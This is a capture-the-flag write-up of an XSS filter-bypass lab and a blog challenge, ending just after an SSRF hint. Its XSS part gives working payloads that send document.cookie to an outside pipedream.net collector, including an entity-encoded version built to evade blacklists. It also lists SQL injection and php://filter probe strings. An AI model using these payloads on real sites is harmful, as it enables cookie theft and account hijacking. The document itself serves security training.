# XSS LAbs 
The blacklist  chall 

Desc-
>We got an access to a training resource from WebTopia, where they practise XSS filter bypassing. Enjoy it!
Note: If your payload does not seem to work at first, please use RequestBin to check before contacting the support.

### Rekon 
- Have to bypass four steps to get the flag , Uses Websitehook or RequestBin to catch the request made , our goal is to steal the cookie

### solution
- XSS 1/4 has no filter just use 

```
<img src=x onerror="location='//eo25c6u4oi6ob9b.m.pipedream.net?c='+document.cookie"> 

```
visit the next site at `/0d566d04bbc014c2d1d0902ad50a4122`

- XSS 2/4 
```
def filter_2(payload):
    regex = ".*(script|(</.*>)).*"
    if re.match(regex, payload):
return "Nope"
    return payload
```

The word script and closing tags are blacklisted so used 

```
<img src=x onerror="location='//eo25c6u4oi6ob9b.m.pipedream.net?c='+document.cookie">

```
Got and visit `/5d1aaeadf1b52b4f2ab7042f3319a267`

- XSS 3/4 

```
def filter_3(payload):
    regex = ".*(://|script|(</.*>)|(on\w+\s*=)).*"
    if re.match(regex, payload):
return "Nope"
    return payload
```

Additionally the https url :// and inline event handlers are also blocked. 

```
<img src=x ONERROR=&#101;&#118;&#97;&#108;&#40;&#34;&#119;&#105;&#110;&#100;&#111;&#119;&#46;&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&#61;&#39;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#101;&#111;&#50;&#53;&#99;&#54;&#117;&#52;&#111;&#105;&#54;&#111;&#98;&#57;&#98;&#46;&#109;&#46;&#112;&#105;&#112;&#101;&#100;&#114;&#101;&#97;&#109;&#46;&#110;&#101;&#116;&#63;&#99;&#61;&#39;&#43;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#34;&#41;>

```
running this to get 

`/b355082fc794c4d1d2b6c02e04163090`

which is just decimal encoding for eval("window.location='https://eo25c6u4oi6ob9b.m.pipedream.net?c=' + document.cookie")
 
- XSS 4/4 use the above one for this part as well 

`flag=N0PS{n0w_Y0u_4r3_x55_Pr0}`

Lesson Learnt - Char encoding for any shitty blacklist bypass . 


# Blog 
> It seems that WebTopia deployed a blog for all its inhabitants. Can you investigate on it ?

Initial Rekon : 
- `/blog.php?blog=` base endpoint
-JSON based response like `{"id":, "title":"...", "content":"...", "name":"..."}`
- `1 to 3` givesnormal behaviour for 3 to 100 , the response is null, same for edge cases .
- anything like `/blog.php?blog=abcd` returned `{"error":"Invalid ID"}` 
- basic `/blog.php?blog=-1 UNION SELECT 1,2,3--` gave 400 bad request 
- same for php filters like `/blog.php?blog=php://filter/convert.base64-encode/resource=index.php` which gave invalid ID 
- Ran Intruder against `/blog.php?blog=$x$` with some payloads getting 200 on all of them but invalid Id 

- There is mention of  contacting Sylvester , and if i want my own account but no endpoint like register/account/login exist. Sylevester blog doesnt reveal anything

They say no to fuzzing

### Solution 
- `Warning: Request should only be sent to backend host.`
on  `/blog.php?blog=http://eooyidmjw1f2zmy.m.pipedream.net`

Gave a smell of SSRF and to confirm that tried bunch of Combinations to get a hit  

